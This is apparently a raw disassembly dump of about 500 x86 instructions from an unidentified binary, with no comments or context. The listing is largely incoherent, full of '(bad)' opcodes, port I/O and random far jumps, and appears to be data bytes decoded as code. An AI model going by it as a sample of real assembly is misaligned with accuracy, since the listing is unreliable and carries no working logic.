  41fb2d:	jmp    0x41fb77
  41fb2f:	xor    al,0x12
  41fb31:	push   esi
  41fb32:	lahf   
  41fb33:	and    BYTE PTR [eax+0x66dd2fe7],dh
  41fb39:	js     0x41fb76
  41fb3b:	int    0x89
  41fb3d:	nop
  41fb3e:	inc    ebx
  41fb3f:	rcr    eax,1
  41fb41:	fiadd  WORD PTR [ebx]
  41fb43:	or     DWORD PTR [edx*2+0x648c741],ebx
  41fb4a:	fcomp  DWORD PTR [edi-0x56]
  41fb4d:	or     eax,0x87cb0c6d
  41fb52:	sub    eax,0xb6379c7d
  41fb57:	mov    ds:0x6d09905e,al
  41fb5c:	dec    edx
  41fb5d:	cmp    ebx,edi
  41fb5f:	cmp    DWORD PTR [esp+edx*4],0x69d83308
  41fb66:	inc    ecx
  41fb67:	push   esp
  41fb68:	jge    0x41fb9a
  41fb6a:	jno    0x41fb78
  41fb6c:	push   esp
  41fb6d:	or     BYTE PTR [ebp-0x54],ch
  41fb70:	cmp    eax,0xd3d45c7b
  41fb75:	fs pop ds
  41fb77:	int3   
  41fb78:	ins    BYTE PTR es:[edi],dx
  41fb79:	out    0xe2,al
  41fb7b:	mov    bl,0xc8
  41fb7d:	sbb    BYTE PTR [edi+0x785cf181],ch
  41fb83:	inc    esi
  41fb84:	outs   dx,BYTE PTR ds:[esi]
  41fb85:	loopne 0x41fb0c
  41fb87:	dec    esp
  41fb88:	dec    ebx
  41fb89:	cs xchg esp,eax
  41fb8b:	mov    ds:0x5dfd3e4d,al
  41fb90:	enter  0x1039,0xc7
  41fb94:	dec    ebx
  41fb95:	int    0xb5
  41fb97:	cmp    BYTE PTR [ebx-0x12],dl
  41fb9a:	and    ch,BYTE PTR [eax]
  41fb9c:	mov    ebx,0xd51c06f6
  41fba1:	int    0xc
  41fba3:	sub    ch,BYTE PTR [eax+0x10]
  41fba6:	icebp  
  41fba7:	jl     0x41fbb8
  41fba9:	dec    ebp
  41fbaa:	add    al,0x8d
  41fbac:	int3   
  41fbad:	fld    QWORD PTR [ebp+0x31bbd3d2]
  41fbb3:	pop    ss
  41fbb4:	(bad)  
  41fbb5:	mov    al,ds:0x7dfd0abf
  41fbba:	push   esi
  41fbbb:	dec    esp
  41fbbc:	xor    ch,al
  41fbbe:	(bad)  
  41fbbf:	cmp    DWORD PTR [ebx+0x143fc44],0x19b8ae82
  41fbc9:	jo     0x41fbea
  41fbcb:	dec    esi
  41fbcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbcd:	retf   
  41fbce:	int3   
  41fbcf:	xchg   edx,eax
  41fbd0:	mov    bl,0xf1
  41fbd2:	(bad)  
  41fbd3:	mov    esi,0x636c73de
  41fbd8:	mov    bh,0x86
  41fbda:	ins    DWORD PTR es:[edi],dx
  41fbdb:	sti    
  41fbdc:	and    BYTE PTR [edi+eiz*4-0x28],cl
  41fbe0:	mov    ebx,0xb8b8f0b
  41fbe5:	sub    BYTE PTR [ebx-0x40f41b77],al
  41fbeb:	int3   
  41fbec:	inc    edx
  41fbed:	xor    dl,BYTE PTR [esi]
  41fbef:	sbb    ebp,esi
  41fbf1:	mov    edi,0xa6a1a9d1
  41fbf6:	fwait
  41fbf7:	sub    eax,0x2292a02b
  41fbfc:	push   ss
  41fbfd:	pop    ebp
  41fbfe:	cmc    
  41fbff:	out    dx,al
  41fc00:	aam    0x30
  41fc02:	sbb    bh,BYTE PTR [edx]
  41fc04:	cmp    ebp,DWORD PTR [edi]
  41fc06:	retf   0x7639
  41fc09:	mov    edx,0xdf2417d2
  41fc0e:	push   ebx
  41fc0f:	dec    edx
  41fc10:	pop    ds
  41fc11:	mov    cs,WORD PTR [ebx-0x50]
  41fc14:	ja     0x41fc29
  41fc16:	aaa    
  41fc17:	mov    BYTE PTR [edi+0x2a0f7d7b],al
  41fc1d:	jle    0x41fc0c
  41fc1f:	adc    esp,DWORD PTR [ebx-0x3c]
  41fc22:	push   edi
  41fc23:	xchg   esp,eax
  41fc24:	cmc    
  41fc25:	mov    ds,WORD PTR [ecx-0xd04fdfe]
  41fc2b:	dec    eax
  41fc2c:	dec    esi
  41fc2d:	(bad)  
  41fc2e:	into   
  41fc2f:	push   esi
  41fc30:	mov    BYTE PTR [ecx],dl
  41fc32:	jg     0x41fc55
  41fc34:	dec    ebx
  41fc35:	push   esi
  41fc36:	popa   
  41fc37:	int3   
  41fc38:	add    eax,0xe459c3a6
  41fc3d:	add    eax,0xa5dfddc3
  41fc42:	stos   DWORD PTR es:[edi],eax
  41fc43:	sbb    BYTE PTR [ebx],dh
  41fc45:	out    0xc6,eax
  41fc47:	out    0xb3,eax
  41fc49:	cld    
  41fc4a:	inc    ebp
  41fc4b:	dec    ebp
  41fc4c:	out    0x7e,eax
  41fc4e:	popa   
  41fc4f:	(bad)  
  41fc50:	jmp    0x9473:0x8403f5c
  41fc57:	scas   eax,DWORD PTR es:[edi]
  41fc58:	xchg   edi,eax
  41fc59:	and    al,0xa2
  41fc5b:	inc    esi
  41fc5c:	jo     0x41fc99
  41fc5e:	cmp    ah,bl
  41fc60:	push   ecx
  41fc61:	outs   dx,DWORD PTR ds:[esi]
  41fc62:	xchg   DWORD PTR [ebp+0x53],esp
  41fc65:	clc    
  41fc66:	add    al,dl
  41fc68:	jns    0x41fbed
  41fc6a:	sub    bh,BYTE PTR [esi-0x1bb8cb72]
  41fc70:	dec    edx
  41fc71:	daa    
  41fc72:	mov    BYTE PTR [edi+0x25fe9b55],cl
  41fc78:	aam    0xcb
  41fc7a:	sub    BYTE PTR [edi-0x48],dl
  41fc7d:	gs clc 
  41fc7f:	das    
  41fc80:	popf   
  41fc81:	xchg   ebx,eax
  41fc82:	mov    esi,0x97aae0c6
  41fc87:	or     DWORD PTR [edx],ebx
  41fc89:	fild   QWORD PTR ds:0xa3212439
  41fc8f:	adc    eax,0xb57fcfe7
  41fc94:	mov    al,0x8b
  41fc96:	int3   
  41fc97:	xchg   esp,eax
  41fc98:	mov    ds:0xa7460932,al
  41fc9d:	leave  
  41fc9e:	xchg   ebp,eax
  41fc9f:	pop    esi
  41fca0:	outs   dx,BYTE PTR ds:[esi]
  41fca1:	dec    esp
  41fca2:	sti    
  41fca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fca4:	js     0x41fca9
  41fca6:	or     esi,esi
  41fca8:	or     dh,dh
  41fcaa:	cmp    al,0x80
  41fcac:	or     BYTE PTR [esi+ecx*4+0x1],al
  41fcb0:	nop
  41fcb1:	test   BYTE PTR ds:0xe6551c1c,0x14
  41fcb8:	pop    esp
  41fcb9:	ja     0x41fc6f
  41fcbb:	call   0xf9fa:0x60fa0784
  41fcc2:	jnp    0x41fccc
  41fcc4:	inc    eax
  41fcc5:	adc    BYTE PTR [eax],bl
  41fcc7:	mov    dh,0xbb
  41fcc9:	or     DWORD PTR [ecx],eax
  41fccb:	and    al,0x1d
  41fccd:	cdq    
  41fcce:	jo     0x41fd48
  41fcd0:	(bad)  
  41fcd1:	cmp    DWORD PTR ss:[eax],esp
  41fcd4:	xor    eax,0x451e7a71
  41fcd9:	adc    BYTE PTR [esi-0x30258579],ch
  41fcdf:	xor    eax,0x6f442320
  41fce4:	pop    edi
  41fce5:	hlt    
  41fce6:	ins    DWORD PTR es:[edi],dx
  41fce7:	je     0x41fca8
  41fce9:	(bad)  
  41fcea:	xlat   BYTE PTR ds:[ebx]
  41fceb:	nop
  41fcec:	push   esi
  41fced:	(bad)  
  41fcee:	ja     0x41fcd2
  41fcf0:	jmp    0x20b70681
  41fcf5:	jne    0x41fcd5
  41fcf7:	mov    esp,0x8ff22042
  41fcfc:	adc    eax,0xb35a3fbc
  41fd01:	(bad)
  41fd05:	mov    dl,BYTE PTR [edi-0x194116f7]
  41fd0b:	lods   al,BYTE PTR ds:[esi]
  41fd0c:	sbb    al,0xe9
  41fd0e:	hlt    
  41fd0f:	jmp    0x41fcab
  41fd11:	xchg   ebx,eax
  41fd12:	fs daa 
  41fd14:	dec    edx
  41fd15:	fld    QWORD PTR ds:0xae7ff8ba
  41fd1b:	xchg   edi,eax
  41fd1c:	sub    bl,ch
  41fd1e:	ror    BYTE PTR [esi-0x68],0x60
  41fd22:	nop
  41fd23:	jecxz  0x41fd3a
  41fd25:	or     DWORD PTR [ecx-0x3b],0x7e77d7f5
  41fd2c:	sub    al,0x60
  41fd2e:	pop    ebp
  41fd2f:	shl    BYTE PTR [eax+edi*2],0xe7
  41fd33:	add    cl,ch
  41fd35:	aam    0x99
  41fd37:	cmp    BYTE PTR [eax],bh
  41fd39:	mov    dh,0xb2
  41fd3b:	pop    ebp
  41fd3c:	rol    DWORD PTR ds:[eax+eax*4+0x61],cl
  41fd41:	cmovne eax,DWORD PTR [edx+0x3d2962e]
  41fd48:	cmp    esi,DWORD PTR [esi+0x63bcaf1d]
  41fd4e:	je     0x41fcff
  41fd50:	iret   
  41fd51:	inc    eax
  41fd52:	push   es
  41fd53:	push   ebx
  41fd54:	(bad)  
  41fd56:	cmp    cl,BYTE PTR [esi]
  41fd58:	and    edi,edi
  41fd5a:	je     0x41fda3
  41fd5c:	aas    
  41fd5d:	xor    ah,ah
  41fd5f:	push   es
  41fd60:	loope  0x41fdb3
  41fd62:	adc    ebp,ebp
  41fd64:	or     ecx,esi
  41fd66:	and    edi,DWORD PTR [edx-0x71]
  41fd69:	jge    0x41fde2
  41fd6b:	test   DWORD PTR [esi+0x27],eax
  41fd6e:	mov    ds:0xec5c6496,al
  41fd73:	cwde   
  41fd74:	adc    al,0x64
  41fd76:	sar    DWORD PTR [ebx],0xca
  41fd79:	std    
  41fd7a:	and    DWORD PTR [ecx-0x2e],esp
  41fd7d:	fucomi st,st(4)
  41fd7f:	xchg   BYTE PTR [edx],ch
  41fd81:	hlt    
  41fd82:	mov    eax,ds:0x64155eac
  41fd87:	shl    BYTE PTR ds:0x8ab5e9b5,1
  41fd8d:	jne    0x41fd4a
  41fd8f:	jno    0x41fdb8
  41fd91:	cmp    dl,BYTE PTR [ebx+0x3e]
  41fd94:	add    al,0x77
  41fd96:	int3   
  41fd97:	fdiv   DWORD PTR [edx]
  41fd99:	mov    al,ds:0x3495b50
  41fd9e:	stos   BYTE PTR es:[edi],al
  41fd9f:	lahf   
  41fda0:	or     DWORD PTR [ebp-0x324eea3c],esp
  41fda6:	xchg   BYTE PTR [ecx+0x361b48b1],cl
  41fdac:	or     DWORD PTR [ecx],edi
  41fdae:	dec    edi
  41fdaf:	jb     0x41fd95
  41fdb1:	ret    0xd276
  41fdb4:	sbb    BYTE PTR [ecx+0x6e],dh
  41fdb7:	mov    WORD PTR [esi+edi*2-0x42f9c8a9],fs
  41fdbe:	push   eax
  41fdbf:	call   0xec6a:0xb1f45ebb
  41fdc6:	stos   DWORD PTR es:[edi],eax
  41fdc7:	ret    0x20a4
  41fdca:	and    BYTE PTR [esi],0x12
  41fdcd:	sahf   
  41fdce:	push   cs
  41fdcf:	mov    ebp,ebp
  41fdd1:	add    dl,BYTE PTR [ebx-0x30bce47b]
  41fdd7:	cli    
  41fdd8:	mov    DWORD PTR [eax+0xd4287b1],esp
  41fdde:	mov    ch,0x56
  41fde0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fde1:	nop
  41fde2:	fnstsw WORD PTR [ebp+0x60727b39]
  41fde8:	scas   eax,DWORD PTR es:[edi]
  41fde9:	pop    ss
  41fdea:	cld    
  41fdeb:	aas    
  41fdec:	push   0x3d
  41fdee:	push   esi
  41fdef:	dec    eax
  41fdf0:	inc    edx
  41fdf1:	sbb    al,0x8c
  41fdf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdf4:	cli    
  41fdf5:	cwde   
  41fdf6:	jae    0x41fe4f
  41fdf8:	out    0x6b,eax
  41fdfa:	or     DWORD PTR [ebx+0x24],ebx
  41fdfd:	adc    BYTE PTR [ebp-0x9],dl
  41fe00:	inc    edx
  41fe01:	test   eax,0xaa2c5d49
  41fe06:	cli    
  41fe07:	das    
  41fe08:	or     DWORD PTR [eax+0x34],ebp
  41fe0b:	adc    al,0x4d
  41fe0d:	hlt    
  41fe0e:	cmp    al,0xae
  41fe10:	inc    edi
  41fe11:	sbb    bh,BYTE PTR [ebp-0x72]
  41fe14:	xchg   ecx,eax
  41fe15:	out    dx,eax
  41fe16:	stc    
  41fe17:	ficom  DWORD PTR [edx+edi*1+0x79]
  41fe1b:	(bad)  
  41fe1d:	jae    0x41fdef
  41fe1f:	mov    WORD PTR [eax-0x11f53f8d],?
  41fe25:	inc    edi
  41fe26:	out    0x96,al
  41fe28:	pop    ecx
  41fe29:	sbb    al,0x5d
  41fe2b:	mov    al,ds:0x590addc5
  41fe30:	sbb    DWORD PTR [ecx-0x2fe7dbe0],esi
  41fe36:	mov    ecx,0x4b2e4838
  41fe3b:	shl    DWORD PTR [eax+edi*4-0x6a],cl
  41fe3f:	xor    esp,DWORD PTR [esi]
  41fe41:	into   
  41fe42:	daa    
  41fe43:	mov    esi,0x326d6073
  41fe48:	mov    dh,0xb9
  41fe4a:	js     0x41fe32
  41fe4c:	(bad)  
  41fe4d:	rcl    ch,cl
  41fe4f:	sbb    bh,BYTE PTR [ecx+eiz*8+0x59]
  41fe53:	adc    bl,ah
  41fe55:	and    BYTE PTR [eax+0x1d],ah
  41fe58:	push   0xd3dedf51
  41fe5d:	cmp    al,0xc8
  41fe5f:	fld    TBYTE PTR [ebx-0x3877e206]
  41fe65:	jns    0x41fe7c
  41fe67:	xchg   edi,eax
  41fe68:	jns    0x41fdee
  41fe6a:	dec    esi
  41fe6b:	jne    0x41feb4
  41fe6d:	shl    DWORD PTR [edi],cl
  41fe6f:	jge    0x41febb
  41fe71:	jl     0x41fe88
  41fe73:	sub    ah,BYTE PTR [ecx+0x3aef5646]
  41fe79:	sub    esp,DWORD PTR [edi-0x21]
  41fe7c:	pop    ss
  41fe7d:	mov    eax,ds:0x8734ab4c
  41fe82:	daa    
  41fe83:	lods   eax,DWORD PTR ds:[esi]
  41fe84:	lahf   
  41fe85:	icebp  
  41fe86:	pop    ebx
  41fe87:	in     al,dx
  41fe88:	gs xor esp,edi
  41fe8b:	or     dh,bl
  41fe8d:	loopne 0x41fe25
  41fe8f:	mov    ebx,0x9f6754e0
  41fe94:	adc    al,0x35
  41fe96:	imul   ebp,DWORD PTR [esi-0x78e783f8],0x47
  41fe9d:	retf   
  41fe9e:	jl     0x41fedb
  41fea0:	or     al,0xd8
  41fea2:	jo     0x41fe6d
  41fea4:	mov    ah,0x5d
  41fea6:	push   cs
  41fea7:	xchg   esp,eax
  41fea8:	or     ebx,DWORD PTR [ebx+0x66]
  41feab:	(bad)  
  41feac:	repnz push es
  41feae:	and    al,0xe
  41feb0:	and    DWORD PTR [edx],esi
  41feb2:	xor    BYTE PTR [esi-0x22c9e982],al
  41feb8:	mov    ds:0x7e8b268e,al
  41febd:	lea    edx,[edx]
  41febf:	push   edi
  41fec0:	pop    ss
  41fec1:	pop    ss
  41fec2:	sub    ah,ch
  41fec4:	retf   0x84cd
  41fec7:	and    eax,0x2fa44716
  41fecc:	push   0x25
  41fece:	or     dl,bh
  41fed0:	shr    DWORD PTR [ebp+0x7d],cl
  41fed3:	out    dx,al
  41fed4:	pop    edi
  41fed5:	test   eax,0xa9c83486
  41feda:	mul    BYTE PTR ds:0xa03e7fe8
  41fee0:	mov    ebp,0xa2fd9a8d
  41fee5:	loop   0x41ff11
  41fee7:	or     DWORD PTR [ebx-0x3d28c24b],ecx
  41feed:	mov    eax,ds:0x5d283f4b
  41fef2:	xchg   ecx,eax
  41fef3:	xor    al,0x8a
  41fef5:	inc    esp
  41fef6:	outs   dx,BYTE PTR ds:[esi]
  41fef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef8:	push   0x962c0800
  41fefd:	jp     0x41fe87
  41feff:	mov    bh,0xcc
  41ff01:	xchg   ecx,eax
  41ff02:	clc    
  41ff03:	add    bh,BYTE PTR ds:0xbc04789a
  41ff09:	fucomip st,st(1)
  41ff0b:	sbb    ah,bl
  41ff0d:	pusha  
  41ff0e:	add    BYTE PTR [ecx],dh
  41ff10:	push   ebx
  41ff11:	scas   eax,DWORD PTR es:[edi]
  41ff12:	inc    esp
  41ff13:	retf   0x274b
  41ff16:	adc    al,0x96
  41ff18:	pop    edx
  41ff19:	ds jg  0x41febd
  41ff1c:	pop    edi
  41ff1d:	xor    dl,BYTE PTR [ecx-0x601f37be]
  41ff23:	and    dl,bh
  41ff25:	add    DWORD PTR [ecx+0x4cd46a3a],eax
  41ff2b:	inc    ebx
  41ff2c:	fstp   TBYTE PTR [ecx]
  41ff2e:	fisttp QWORD PTR [esi+eiz*4+0x2d]
  41ff32:	and    al,0xa
  41ff34:	pop    esi
  41ff35:	dec    esp
  41ff36:	mov    dh,0xc5
  41ff38:	outs   dx,DWORD PTR ds:[esi]
  41ff39:	mov    ebx,0xa2f7517f
  41ff3e:	bnd jmp 0x41ff15
  41ff41:	push   ss
  41ff42:	mul    DWORD PTR [edi+0x251e75be]
  41ff48:	fistp  DWORD PTR [ebp+esi*2-0x4b168477]
  41ff4f:	jp     0x41ffc1
  41ff51:	or     bl,ah
  41ff53:	push   ebx
  41ff54:	popa   
  41ff55:	into   
  41ff56:	mov    eax,0x3fe60e6c
  41ff5b:	xor    al,BYTE PTR [ecx+0x6c782a27]
  41ff61:	std    
  41ff62:	cmp    esi,DWORD PTR [ebx]
  41ff64:	in     eax,dx
  41ff65:	jecxz  0x41ff0f
  41ff67:	mov    al,0xb8
  41ff69:	stos   BYTE PTR es:[edi],al
  41ff6a:	cwde   
  41ff6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff6c:	mov    al,0x31
  41ff6e:	sbb    DWORD PTR [esi],edx
  41ff70:	or     eax,DWORD PTR [ecx+0x6fd4e986]
  41ff76:	test   bh,bl
  41ff78:	mov    ?,WORD PTR [edi-0xf]
  41ff7b:	push   edi
  41ff7c:	jns    0x41ff58
  41ff7e:	cmp    ch,dh
  41ff80:	jns    0x41ff23
  41ff82:	(bad)  
  41ff83:	dec    edi
  41ff84:	inc    esp
  41ff85:	dec    ebp
  41ff86:	sahf   
  41ff87:	loope  0x41ff20
  41ff89:	pop    edi
  41ff8a:	pop    eax
  41ff8b:	xchg   BYTE PTR ds:0x7b0e6e18,dl
  41ff91:	ror    BYTE PTR [edi-0x7798b232],0xfc
  41ff98:	jmp    0x10a6:0x1e3e8696
  41ff9f:	jmp    0xa29c:0x7372f125
  41ffa6:	lods   eax,DWORD PTR ds:[esi]
  41ffa7:	pop    ecx
  41ffa8:	mov    esp,0x9c8f4282
  41ffad:	xchg   ebp,eax
  41ffae:	sahf   
  41ffaf:	pop    ebp
  41ffb0:	adc    DWORD PTR [eax+0xbc22489],0xffffffe1
  41ffb7:	mov    dl,0xf7
  41ffb9:	test   al,0x54
  41ffbb:	xchg   ebx,eax
  41ffbc:	xchg   esi,eax
  41ffbd:	out    dx,eax
  41ffbe:	sbb    BYTE PTR [edi],dh
  41ffc0:	push   ds
  41ffc1:	jno    0x420009
  41ffc3:	cmc    
  41ffc4:	cli    
  41ffc5:	out    0x58,al
  41ffc7:	push   ecx
  41ffc8:	or     al,0x7a
  41ffca:	mov    ch,ah
  41ffcc:	add    eax,0xee6d63da
  41ffd1:	mov    DWORD PTR ds:0x8186cd03,0x60d89e13
  41ffdb:	(bad)  
  41ffdc:	xchg   ebx,eax
  41ffdd:	push   esp
  41ffde:	arpl   bx,si
  41ffe0:	jmp    0x420015
  41ffe2:	in     eax,dx
  41ffe3:	repz icebp 
  41ffe5:	dec    edx
  41ffe6:	pusha  
  41ffe7:	xchg   esi,eax
  41ffe8:	and    ecx,ecx
  41ffea:	mov    cs,WORD PTR [edi]
  41ffec:	push   ds
  41ffed:	repnz sub DWORD PTR [edi-0x1],0x86bee8a2
  41fff5:	popa   
  41fff6:	push   ecx
  41fff7:	cmp    BYTE PTR [ecx+ebp*1],0x8a
  41fffb:	adc    bl,ch
  41fffd:	sub    bh,dl
  41ffff:	mov    ?,WORD PTR [edi]
  420001:	adc    al,0x85
  420003:	cmc    
  420004:	push   0xde5aa67a
  420009:	fwait
  42000a:	enter  0xca50,0x85
  42000e:	mov    edi,0x2856f311
  420013:	lock push eax
  420015:	neg    DWORD PTR ds:0xb81c8162
  42001b:	inc    edi
  42001c:	cmc    
  42001d:	(bad)  
  42001e:	shr    DWORD PTR ds:0x96baa8f3,1
  420024:	popf   
  420025:	(bad)  
  420026:	enter  0xafb5,0x30
  42002a:	call   0xc540:0xf799e3d3
  420031:	adc    DWORD PTR [ebx-0x1e],0x9d4e251c
  420038:	aaa    
  420039:	call   0xefe2025f
  42003e:	inc    edx
  42003f:	adc    eax,0x8b6f32d
  420044:	mov    al,ds:0xcaa525c1
  420049:	aam    0xb7
  42004b:	lea    ebx,[esi+ecx*2+0x7d976b98]
  420052:	or     DWORD PTR [ebp+0x420d8c64],0x8c26d49e
  42005c:	sbb    ch,BYTE PTR [esi+0x73]
  42005f:	adc    dl,BYTE PTR [ebx-0x68]
  420062:	mov    esp,esi
  420064:	shl    BYTE PTR [ebp-0x2c91c1ed],cl
  42006a:	mov    ch,ch
  42006c:	sbb    al,0x72
  42006e:	scas   eax,DWORD PTR es:[edi]
  42006f:	lea    eax,[ebx+0x7f]
  420072:	and    ebx,DWORD PTR [edi+0x716e1d5e]
  420078:	inc    eax
  420079:	push   ss
  42007a:	jo     0x42002f
  42007c:	mov    dl,0x93
  42007e:	sahf   
  42007f:	xor    eax,0xa94fa37e
  420084:	dec    eax
  420085:	int3   
  420086:	xor    dl,ah
  420088:	retf   
  420089:	pop    ebx
  42008a:	fwait
  42008b:	adc    DWORD PTR [ecx-0x59],ebp
  42008e:	adc    BYTE PTR [edx+0x11],al
  420091:	out    0xc,eax
  420093:	push   0xffffffb8
  420095:	push   ds
  420096:	and    DWORD PTR [esi],ebx
  420098:	dec    ebx
  420099:	adc    al,0x6e
  42009b:	data16 xor BYTE PTR [esi],ch
  42009e:	adc    edi,DWORD PTR [esi-0x2174344c]
  4200a4:	adc    ecx,DWORD PTR [ebx-0x6ee01ed6]
  4200aa:	dec    ebp
  4200ab:	jecxz  0x4200f9
  4200ad:	push   cs
  4200ae:	pop    ss
  4200af:	or     al,0xe6
  4200b1:	lods   eax,DWORD PTR ds:[esi]
  4200b2:	sub    bh,BYTE PTR [ebx]
  4200b4:	mov    al,0x47
  4200b6:	and    al,0x1e
  4200b8:	ds xchg esp,eax
  4200ba:	ror    DWORD PTR [edi-0xc7d9feb],0x75
  4200c1:	mov    ds:0x37804c55,al
  4200c6:	imul   esi,esp,0xffffffda
  4200c9:	inc    eax
  4200ca:	xor    ah,BYTE PTR [ebp+0x68]
  4200cd:	popf   
  4200ce:	adc    ebx,DWORD PTR [edx]
  4200d0:	fsubrp st(3),st
  4200d2:	push   es
  4200d3:	inc    esp
  4200d4:	dec    esp
  4200d5:	xor    BYTE PTR ds:0x2d32add6,ch
  4200db:	shr    BYTE PTR [esi+ecx*8+0x22],1
  4200df:	xchg   edx,eax
  4200e0:	xchg   ebp,eax
  4200e1:	inc    ecx
  4200e2:	xchg   esp,eax
  4200e3:	stc    
  4200e4:	pop    es
  4200e5:	popa   
  4200e6:	push   0x1
  4200e8:	sub    dl,al
  4200ea:	shl    esi,0xd1
  4200ed:	mov    eax,0xf26bf493
  4200f2:	mul    edi
  4200f4:	sub    edi,ebx
  4200f6:	das    
  4200f7:	cld    
  4200f8:	pop    eax
  4200f9:	add    DWORD PTR [esi],ebx
  4200fb:	mov    ds:0x11a7fc21,al
  420100:	sub    eax,0x6a026e3e
  420105:	popa   
  420106:	rcr    BYTE PTR [ecx-0x2e],cl
  420109:	xchg   ebp,eax
  42010a:	jne    0x4200b9
  42010c:	dec    ecx
  42010d:	call   0xe9dca27f
  420112:	xchg   ecx,eax
  420113:	cmp    ch,BYTE PTR [eax+ebp*4]
  420116:	nop
  420117:	(bad)  
  420118:	into   
  420119:	lea    ecx,[eax]
  42011b:	push   ebp
  42011c:	imul   esi,DWORD PTR [ecx],0x6d
  42011f:	je     0x42017f
  420121:	pop    eax
  420122:	dec    esi
  420123:	ds ins DWORD PTR es:[edi],dx
  420125:	push   esp
  420126:	jmp    0x420198
  420128:	add    cl,0xb
  42012b:	lods   eax,DWORD PTR ds:[esi]
  42012c:	pop    es
  42012d:	sbb    DWORD PTR [esi+0x5d],eax
  420130:	ja     0x420144
  420132:	fwait
  420133:	mov    ds:0xb06759a2,eax
  420138:	outs   dx,DWORD PTR ds:[esi]
  420139:	mov    cl,0xf0
  42013b:	sahf   
  42013c:	xor    dh,BYTE PTR [esi-0x7c]
  42013f:	sub    dh,BYTE PTR [ecx+0x59]
  420142:	shl    BYTE PTR [edi],1
  420144:	in     al,0x62
  420146:	das    
  420147:	mov    edx,0x7d09d2a0
  42014c:	mov    al,ds:0xf81893f6
  420151:	in     al,dx
  420152:	xchg   ebp,eax
  420153:	retf   0x18f8
  420156:	sbb    DWORD PTR [ebx-0x3c1a7fd0],0xfffffff8
  42015d:	xchg   ebx,eax
  42015e:	lods   eax,DWORD PTR ds:[esi]
  42015f:	lds    ecx,FWORD PTR [ebp+0x42]
  420162:	dec    ecx
  420163:	dec    ebx
  420164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420165:	add    eax,0x34cd197d
  42016a:	lahf   
  42016b:	xor    eax,0xe87fd358
  420170:	aad    0x7b
  420172:	(bad)  
  420173:	popa   
  420174:	push   eax
  420175:	xchg   dx,ax
  420177:	mov    ebx,0x9d0cbef6
  42017c:	xchg   cl,bh
  42017e:	jnp    0x420188
  420180:	pop    esp
  420181:	add    eax,0xe5ba9a8c
  420186:	xor    eax,0x8e6e4d85
  42018b:	lahf   
  42018c:	dec    ebx
  42018d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018e:	cwde   
  42018f:	test   BYTE PTR [ecx+0x6b],dh
  420192:	sahf   
  420193:	iret   
  420194:	xchg   cl,dh
  420196:	(bad)  
  420197:	cmp    DWORD PTR [ecx+0x2a],esp
  42019a:	sub    edx,0xffffffae
  42019d:	loop   0x420149
  42019f:	mov    eax,0x2f2c48a4
  4201a4:	cld    
  4201a5:	or     al,0x8f
  4201a7:	fcom   DWORD PTR [ecx+0x16]
  4201aa:	mov    ch,0x65
  4201ac:	sbb    bl,BYTE PTR [ebx+0x63]
  4201af:	jmp    0x1eb5:0x3a5c8c37
  4201b6:	setb   BYTE PTR [edi]
  4201b9:	add    DWORD PTR [edx],ebp
  4201bb:	fs sbb al,0x11
  4201be:	inc    ecx
  4201bf:	iret   
  4201c0:	rcl    ebx,1
  4201c2:	dec    esp
  4201c3:	les    edi,FWORD PTR ss:[edx]
  4201c6:	into   
  4201c7:	enter  0x12a5,0xb1
  4201cb:	test   BYTE PTR ds:0x13d5de81,ah
  4201d1:	loop   0x420187
  4201d3:	cdq    
  4201d4:	mov    ebx,0x1f8a4dc2
  4201d9:	sbb    eax,0x1c73efa
  4201de:	ins    DWORD PTR es:[edi],dx
  4201df:	stos   BYTE PTR es:[edi],al
  4201e0:	mov    bl,0xae
  4201e2:	addr16 sbb eax,0xb5ccb68b
  4201e8:	in     eax,0xcc
  4201ea:	sub    al,0x4d
  4201ec:	jle    0x4201e3
  4201ee:	loop   0x42018d
  4201f0:	retf   0xe4d4
  4201f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201f4:	ins    DWORD PTR es:[edi],dx
  4201f5:	bound  ecx,QWORD PTR [edi-0x7b]
  4201f8:	pop    ebx
  4201f9:	aad    0xce
  4201fb:	idiv   dh
  4201fd:	fwait
  4201fe:	sti    
  4201ff:	pop    eax
  420200:	repnz sub al,0xae
  420203:	jne    0x42022b
  420205:	imul   edi,DWORD PTR [ebp-0x2476e0d0],0xe62864c3
  42020f:	mov    dh,0x41
  420211:	lea    edi,[ebx+ebx*4-0x62]
  420215:	bound  edx,QWORD PTR ss:[esi-0x7a]
  420219:	or     bl,ah
  42021b:	and    cl,BYTE PTR [esi+ebp*8+0x59]
  42021f:	ds mov ?,WORD PTR gs:[edx-0x73500b79]
  420227:	dec    edi
  420228:	pop    ebp
  420229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42022a:	dec    ebx
  42022b:	(bad)  
  42022c:	push   0x4ebd3c61
  420231:	xchg   edx,eax
  420232:	jmp    0x791ee01c
  420237:	push   ecx
  420238:	fst    DWORD PTR [ebx-0x5a]
  42023b:	outs   dx,DWORD PTR ds:[esi]
  42023c:	lock jg 0x420250
  42023f:	call   0xad34d427
  420244:	je     0x420216
  420246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420247:	mov    ch,0xd8
  420249:	or     cl,BYTE PTR [edx-0x68233cc6]
  42024f:	fwait
  420250:	loope  0x42020f
  420252:	mov    cl,0xec
  420254:	jb     0x42022f
  420256:	fwait
  420257:	les    ecx,FWORD PTR [edx]
  420259:	repz les ebp,FWORD PTR [edi]
  42025c:	addr16 jmp 0x4201f7
  42025f:	aam    0x68
  420261:	push   ecx
  420262:	shl    DWORD PTR ds:0x61d96a89,0x16
  420269:	add    DWORD PTR [ecx],esi
  42026b:	fidiv  DWORD PTR [eax+ecx*4-0x32]
  42026f:	inc    edi
  420270:	add    al,BYTE PTR [ebx+0x21]
  420273:	cmp    BYTE PTR ds:0x36bf2bed,bh
  420279:	mov    bl,BYTE PTR [ebp+0x40bb7e91]
  42027f:	adc    eax,0x2199afe9
  420284:	scas   al,BYTE PTR es:[edi]
  420285:	sti    
  420286:	sub    al,ah
  420288:	ret    
  420289:	rcr    BYTE PTR [ebp+0x19],0xb4
  42028d:	dec    edx
